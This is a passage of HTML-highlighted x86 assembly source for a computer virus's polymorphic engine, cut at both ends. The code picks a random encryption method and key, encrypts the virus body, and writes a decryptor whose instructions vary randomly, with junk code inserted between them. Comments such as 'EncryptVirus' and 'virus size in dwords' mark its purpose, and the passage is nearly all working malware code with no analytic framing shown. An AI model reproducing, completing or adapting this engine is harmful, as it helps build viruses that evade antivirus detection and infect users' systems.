    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1f40h</span><span class="sc0">       </span><span class="sc1">;get random numebr between 0 ~ 8000</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7d0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">NextM</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionMethod</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0"> </span><span class="sc1">;use not</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EncryptVirus</span><span class="sc0">
</span><span class="sc5">NextM</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fa0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">NextM2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionMethod</span><span class="sc4">],</span><span class="sc2">2h</span><span class="sc0"> </span><span class="sc1">;use add</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EncryptVirus</span><span class="sc0">
</span><span class="sc5">NextM2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1770h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">NextM3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionMethod</span><span class="sc4">],</span><span class="sc2">3h</span><span class="sc0"> </span><span class="sc1">;use sub</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EncryptVirus</span><span class="sc0">
</span><span class="sc5">NextM3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionMethod</span><span class="sc4">],</span><span class="sc2">4h</span><span class="sc0"> </span><span class="sc1">;use xor</span><span class="sc0">
</span><span class="sc5">EncryptVirus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;get random key</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SizeOfDataToEncrypt</span><span class="sc0">     </span><span class="sc1">;size of data in words</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">StartOfDataToEncrypt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">@enc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionMethod</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0">    </span><span class="sc1">;is not ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextE</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_stosw</span><span class="sc0">
</span><span class="sc5">NextE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionMethod</span><span class="sc4">],</span><span class="sc2">2h</span><span class="sc0">    </span><span class="sc1">;is add ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextE2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_stosw</span><span class="sc0">
</span><span class="sc5">NextE2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionMethod</span><span class="sc4">],</span><span class="sc2">3h</span><span class="sc0">    </span><span class="sc1">;is sub ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextE4</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_stosw</span><span class="sc0">
</span><span class="sc5">NextE4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;xor</span><span class="sc0">
</span><span class="sc5">_stosw</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@enc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WhereToWriteDecryptor</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInstruction1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInstruction2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInstruction3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInstruction4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PolyBuffer</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">;saved for loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInstruction5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInstruction6</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInstruction7</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInstruction8</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInstruction9</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">EncryptionMethod</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;1=not 2=add 3=sub 4=xor</span><span class="sc0">
    </span><span class="sc5">key</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SizeOfDecryptor</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">WhereToWriteDecryptor</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">StartOfDataToEncrypt</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ProgramImageBase</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">PolyBuffer</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SizeOfDataToEncrypt</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VirusSize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc1">;virus size in dwords</span><span class="sc0">
    </span><span class="sc5">FixRVA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        
</span><span class="sc5">WriteInstruction1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function write pushad instruction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">60h</span><span class="sc0">  </span><span class="sc1">;pushad</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">WriteInstruction2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function set esi register to start of encrypted virus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">StartOfDataToEncrypt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ProgramImageBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FixRVA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">        </span><span class="sc1">;get random number between 0 ~ 255</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins2_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0beh</span><span class="sc0"> </span><span class="sc1">;way 1:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;mov esi,StartOfDataToEncrypt</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins2</span><span class="sc0">
</span><span class="sc5">ins2_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins2_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">68h</span><span class="sc0">  </span><span class="sc1">;way 2:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;push   StartOfDataToEncrypt</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">       </span><span class="sc1">;pop    esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">5eh</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins2</span><span class="sc0">
</span><span class="sc5">ins2_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">99h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins2_3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0f633h</span><span class="sc0">   </span><span class="sc1">;way 3:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">          </span><span class="sc1">;xor esi,esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ins2oresival</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins2</span><span class="sc0">
</span><span class="sc5">ins2_3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins2_4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0f62bh</span><span class="sc0">   </span><span class="sc1">;way 4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">          </span><span class="sc1">;sub esi,esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ins2oresival</span><span class="sc0">       
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins2</span><span class="sc0">
</span><span class="sc5">ins2_4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;way 5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0beh</span><span class="sc0"> </span><span class="sc1">;mov esi,not StartOfDataToEncrypt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> 
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0d6f7h</span><span class="sc0">   </span><span class="sc1">;not esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
</span><span class="sc5">retins2</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">_ins2oresival</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;write or esi,StartOfDataToEncrypt instruction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0ce81h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">WriteInstruction3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function set edi register to esi register</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins3_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0fe8bh</span><span class="sc0">   </span><span class="sc1">;mov edi,esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins3</span><span class="sc0">
</span><span class="sc5">ins3_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins3_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">56h</span><span class="sc0">  </span><span class="sc1">;push esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">5fh</span><span class="sc0">  </span><span class="sc1">;pop edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins3</span><span class="sc0">
</span><span class="sc5">ins3_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins3_3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0fe87h</span><span class="sc0">   </span><span class="sc1">;xchg edi esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0f78bh</span><span class="sc0">   </span><span class="sc1">;mov esi,edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins3</span><span class="sc0">
</span><span class="sc5">ins3_3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0f787h</span><span class="sc0">   </span><span class="sc1">;xchg edi esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0f78bh</span><span class="sc0">   </span><span class="sc1">;mov esi,edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
</span><span class="sc5">retins3</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">WriteInstruction4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function set ecx with the size of the virus in dwords</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">SizeOfDataToEncrypt</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins4_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0b9h</span><span class="sc0"> </span><span class="sc1">;mov ecx,sizeofvirusindwords</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins4</span><span class="sc0"> 
</span><span class="sc5">ins4_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins4_2</span><span class="sc0">
